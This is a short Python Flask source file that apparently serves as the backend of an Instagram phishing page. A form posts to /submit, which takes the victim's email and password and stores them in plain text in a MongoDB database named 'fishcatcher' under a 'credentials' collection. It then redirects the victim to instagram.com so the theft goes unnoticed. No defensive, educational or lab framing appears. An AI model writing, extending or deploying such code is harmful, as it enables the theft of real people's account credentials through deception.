from flask import Flask, request, render_template, jsonify, redirect
#import instaloader
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import os
import logging

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

uri = os.getenv("MONGODB_URI")

client = MongoClient(uri, server_api=ServerApi('1'))
db = client.fishcatcher
collection = db.credentials

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    logger.info("Endpoint /submit alcanzado")

    try:
        #email = request.form['email']
        email = request.form.get('email')
        #password = request.form['password']
        password = request.form.get('password')
        #logger.info(f"Datos recibidos en /submit: email={email}, password={password}")

        collection.insert_one({"email": email, "password": password})
        logger.info("Datos almacenados correctamente en MongoDB.")
        
        #return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
        return redirect("https://instagram.com")
    except Exception as e:
        logger.error(f"Error al almacenar credenciales: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(port=5001)
